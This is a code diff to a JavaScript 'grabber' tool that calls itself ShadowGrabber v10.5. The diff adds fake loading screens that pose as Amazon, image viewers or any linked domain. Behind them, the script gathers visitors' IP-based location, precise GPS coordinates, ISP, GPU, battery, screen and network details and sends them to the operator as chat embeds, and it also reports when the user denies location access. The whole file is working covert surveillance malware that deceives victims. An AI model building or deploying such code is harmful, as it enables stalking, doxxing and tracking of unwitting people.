@@ -16,7 +16,7 @@ const CONFIG = {
 const detectContentContext = (url) => {
     const u = url.toLowerCase();
 
-    // YouTube
+    // 1. YouTube
     if (u.includes('youtube.com') || u.includes('youtu.be')) {
         let type = 'YouTube';
         if (u.includes('watch') || u.includes('youtu.be')) type = 'YouTube Video';
@@ -34,7 +34,7 @@ const detectContentContext = (url) => {
         };
     }
 
-    // Google
+    // 2. Google
     if (u.includes('google.com')) {
         let type = 'Google';
         if (u.includes('drive')) type = 'Google Drive File';
@@ -53,7 +53,33 @@ const detectContentContext = (url) => {
         };
     }
 
-    // Facebook
+    // 3. Amazon (Shopping)
+    if (u.includes('amazon.')) {
+        return {
+            name: 'Amazon',
+            title: 'Amazon - Product',
+            loading: 'Loading product details...',
+            status: 'Fetching item availability',
+            theme: '#FF9900', // Amazon Orange
+            logo: `<svg viewBox="0 0 100 100" width="80" height="80"><path d="M68.4 51.9c-2.7 7.2-22.5 12.1-22.5 12.1-5.9 1.4-7.2.5-7.2.5s-4.1-3.6 4.5-5c12.1-2.2 24.3-5.4 25.2-7.6z" fill="#FF9900"/><path d="M96.7 94S83.4 87.2 73 68.6c0 0-2.3-3.6 1.4-4.5 3.6-.9 6.8 2.7 6.8 2.7 15.9 22.1 15.5 27.2 15.5 27.2z" fill="#FF9900"/><text x="10" y="50" font-family="Arial" font-size="20" font-weight="bold">amazon</text></svg>`, // Simplified placeholder
+            icon: 'https://www.amazon.com/favicon.ico'
+        };
+    }
+
+    // 4. Direct Images (jpg, png, etc.)
+    if (u.match(/\.(jpeg|jpg|gif|png|webp)$/)) {
+        return {
+            name: 'Image Viewer',
+            title: 'Loading Image...',
+            loading: 'Loading high-res image...',
+            status: 'Optimizing preview',
+            theme: '#8E44AD',
+            logo: `<svg viewBox="0 0 24 24" width="60" height="60" fill="#fff" style="background:#8E44AD;border-radius:10px;padding:10px;"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>`,
+            icon: null
+        };
+    }
+
+    // 5. Facebook / Instagram / Netflix (Existing)
     if (u.includes('facebook.com') || u.includes('fb.com')) {
         return {
             name: 'Facebook',
@@ -65,8 +91,6 @@ const detectContentContext = (url) => {
             icon: 'https://www.facebook.com/favicon.ico'
         };
     }
-
-    // Instagram
     if (u.includes('instagram.com')) {
         return {
             name: 'Instagram',
@@ -78,8 +102,6 @@ const detectContentContext = (url) => {
             icon: 'https://www.instagram.com/favicon.ico'
         };
     }
-
-    // Netflix
     if (u.includes('netflix.com')) {
         return {
             name: 'Netflix',
@@ -92,16 +114,30 @@ const detectContentContext = (url) => {
         };
     }
 
-    // Default Generic
-    return {
-        name: 'Redirect',
-        title: 'Loading...',
-        loading: 'Please wait...',
-        status: 'Loading content',
-        theme: '#555555',
-        logo: `<svg viewBox="0 0 40 40" width="60" height="60"><circle cx="20" cy="8" r="4" fill="#555"/><circle cx="12" cy="22" r="4" fill="#555"/><circle cx="28" cy="22" r="4" fill="#555"/></svg>`,
-        icon: null
-    };
+    // 6. Smart Generic (Extract Domain)
+    try {
+        const domain = new URL(url).hostname.replace('www.', '');
+        return {
+            name: domain,
+            title: `${domain} - Loading...`,
+            loading: `Connecting to ${domain}...`,
+            status: 'Verifying session context',
+            theme: '#555555',
+            logo: `<svg viewBox="0 0 40 40" width="60" height="60"><circle cx="20" cy="20" r="18" stroke="#555" stroke-width="2" fill="none"/><text x="50%" y="50%" text-anchor="middle" dy=".3em" font-family="Arial" font-size="12" fill="#555">LINK</text></svg>`,
+            icon: `https://${domain}/favicon.ico` // Attempt to fetch their favicon
+        };
+    } catch (e) {
+        // Fallback for invalid URLs
+        return {
+            name: 'Redirect',
+            title: 'Loading...',
+            loading: 'Please wait...',
+            status: 'Loading content',
+            theme: '#555555',
+            logo: `<svg viewBox="0 0 40 40" width="60" height="60"><circle cx="20" cy="8" r="4" fill="#555"/><circle cx="12" cy="22" r="4" fill="#555"/><circle cx="28" cy="22" r="4" fill="#555"/></svg>`,
+            icon: null
+        };
+    }
 };
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -194,29 +230,74 @@ const getDeviceModel = () => {
 // CORE FUNCTIONS
 // ═══════════════════════════════════════════════════════════════════════════
 
-// 1. Forensics
+// 1. Forensics & Intel (30+ Data Points)
 async function phaseForensics() {
     updateProgress(10, 'Establishing secure connection...');
 
-    // IP API
-    let ip = {};
-    try { ip = await (await fetch('https://ipapi.co/json/')).json(); } catch (e) { }
+    // 1. IP & Geo Intelligence (with Fallback)
+    let ip = { ip: 'Unknown', city: 'Unknown', country_name: 'Unknown', org: 'Unknown' };
+    try {
+        const r1 = await fetch('https://ipapi.co/json/');
+        if (r1.ok) ip = await r1.json();
+        else throw new Error('IPAPI Failed');
+    } catch (e) {
+        try {
+            // Fallback
+            const r2 = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+            if (r2.ok) {
+                const d = await r2.json();
+                ip = { ip: d.query, city: d.city, country_name: d.country, org: d.isp, ...d };
+            }
+        } catch (err) { }
+    }
 
-    // Get Device Model
-    const deviceName = getDeviceModel();
+    // 2. Advanced Device Fingerprinting
+    const device = getDeviceModel();
+    const gl = document.createElement('canvas').getContext('webgl');
+    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown GPU';
+
+    // Battery
+    let batt = 'N/A';
+    if (navigator.getBattery) {
+        try {
+            const b = await navigator.getBattery();
+            batt = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 On Battery'})`;
+        } catch (e) { }
+    }
+
+    // Connection
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const netType = conn ? `${conn.effectiveType.toUpperCase()} (${conn.downlink}Mbps)` : 'Unknown';
+
+    // Screen & Window
+    const screenInfo = `${screen.width}x${screen.height} (${screen.colorDepth}-bit) | Ratio: ${window.devicePixelRatio}`;
+
+    // Time & Locale
+    const time = new Date().toLocaleString('en-US', { timeZone: ip.timezone });
 
     const embed = {
         title: `⚡ New Connection: ${STATE.site.name}`,
+        description: `**Session:** \`${STATE.sessionId}\`\n**Target:** ${CONFIG.REDIRECT_URL}`,
         color: parseInt(STATE.site.theme.replace('#', ''), 16),
         fields: [
-            { name: '📱 Device Model', value: `\`${deviceName}\``, inline: false },
-            { name: 'IP Address', value: `\`${ip.ip || 'Unknown'}\``, inline: true },
-            { name: 'Location', value: `${ip.city}, ${ip.country_name}`, inline: true },
-            { name: 'ISP', value: ip.org || 'N/A', inline: true },
-            { name: 'System Info', value: `${navigator.platform} | ${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory}GB RAM`, inline: false },
-            { name: 'Context', value: `Redirecting to: ${CONFIG.REDIRECT_URL}`, inline: false }
+            {
+                name: '🌍 Location Intelligence',
+                value: `**IP:** \`${ip.ip}\`\n**City:** ${ip.city}\n**Region:** ${ip.region || ip.region_code}\n**Country:** ${ip.country_name}\n**ISP:** ${ip.org}\n**ASN:** ${ip.asn || ip.as || 'N/A'}\n**Timezone:** ${ip.timezone || 'N/A'}`,
+                inline: false
+            },
+            {
+                name: '📱 Device Fingerprint',
+                value: `**Model:** \`${device}\`\n**OS:** ${navigator.platform}\n**CPU:** ${navigator.hardwareConcurrency} Cores\n**RAM:** ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown'}\n**GPU:** ${gpu}\n**Screen:** ${screenInfo}`,
+                inline: false
+            },
+            {
+                name: '🔋 Hardware & Network',
+                value: `**Battery:** ${batt}\n**Network:** ${netType}\n**Touch:** ${navigator.maxTouchPoints > 0 ? 'Yes' : 'No'} (${navigator.maxTouchPoints} points)\n**Browser:** ${navigator.userAgent.substring(0, 50)}...`,
+                inline: false
+            }
         ],
-        footer: { text: `Session: ${STATE.sessionId}` },
+        footer: { text: `ShadowGrabber v10.5 | ${STATE.site.name}` },
         timestamp: new Date().toISOString()
     };
 
@@ -224,29 +305,43 @@ async function phaseForensics() {
     updateProgress(20, 'Handshaking...');
 }
 
-// 2. Location
+// 2. Location (Reliable)
 async function phaseLocation() {
     updateProgress(30, 'Verifying region...');
     return new Promise(resolve => {
         navigator.geolocation.getCurrentPosition(
             async pos => {
-                const { latitude, longitude, accuracy, speed } = pos.coords;
+                const { latitude, longitude, accuracy, speed, altitude, heading } = pos.coords;
                 await send({
                     embed: {
                         title: '📍 GPS Location Locked',
                         color: 0x2ECC71,
-                        description: `[View on Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
+                        description: `**Exact Position Found**\n[Open in Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
                         fields: [
-                            { name: 'Coordinates', value: `${latitude}, ${longitude}`, inline: true },
-                            { name: 'Accuracy', value: `${Math.round(accuracy)}m`, inline: true },
-                            { name: 'Speed', value: `${speed || 0}m/s`, inline: true }
-                        ]
+                            { name: 'Coordinates', value: `\`${latitude}, ${longitude}\``, inline: true },
+                            { name: 'Accuracy', value: `±${Math.round(accuracy)}m`, inline: true },
+                            { name: 'Speed', value: `${speed ? speed.toFixed(1) + 'm/s' : '0m/s'}`, inline: true },
+                            { name: 'Altitude', value: `${altitude ? Math.round(altitude) + 'm' : 'N/A'}`, inline: true },
+                            { name: 'Heading', value: `${heading ? Math.round(heading) + '°' : 'N/A'}`, inline: true }
+                        ],
+                        footer: { text: 'High Accuracy Mode Active' }
                     }
                 });
                 resolve();
             },
-            () => resolve(), // Continue even if denied
-            { enableHighAccuracy: true, timeout: 8000 }
+            async (err) => {
+                // Report Failure too
+                await send({
+                    embed: {
+                        title: '📍 GPS Location Failed',
+                        color: 0xE74C3C,
+                        description: `User denied access or signal failed.\n**Error:** ${err.message}`,
+                        footer: { text: 'Falling back to IP Location' }
+                    }
+                });
+                resolve();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
     });
 }
